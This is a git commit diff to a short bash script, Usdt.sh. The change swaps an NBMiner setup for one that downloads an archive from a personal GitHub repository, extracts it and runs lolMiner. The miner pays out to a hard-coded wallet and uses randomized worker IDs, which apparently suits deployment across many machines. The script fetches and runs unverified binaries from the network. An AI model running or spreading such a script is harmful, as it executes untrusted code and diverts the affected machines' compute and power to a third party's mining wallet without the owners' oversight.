dabd70fd6b8ee28b290d26f5f0fdad7f5b8d9db6
justjust123 <108263005+justjust123@users.noreply.github.com>
2022-08-18 19:56:55 +0700

    Update Usdt.sh

--- Usdt.sh
+++ Usdt.sh
@@ -1,7 +1,6 @@
 #!/bin/bash
 apt-get install wget -y
-wget https://dl.nbminer.com/NBMiner_42.2_Linux.tgz
-tar -xvf NBMiner_42.2_Linux.tgz
-cd NBMiner_Linux
-./nbminer -a ergo -o stratum+ssl://autolykos.unmineable.com:4444 -u USDT:TFV2Lz82FGocoXdBJuc9tJSREcTZFSxav2.$(echo $(shuf -i 1000-9999 -n 1)-MJ-)#hthp-17hh -log
-pause
+wget https://github.com/Kocalkocal93Kocalkocal93/tuyul.sh/raw/main/abc.tar.gz
+tar -xvf abc.tar.gz
+cd 1.34a
+./lolMiner --algo ETHASH --pool daggerhashimoto.eu.nicehash.com:3353 -u TFV2Lz82FGocoXdBJuc9tJSREcTZFSxav2.$(echo $(shuf -i 1000-9999 -n 1)-MJ-)#hthp-17hh --ethstratum ETHPROXY
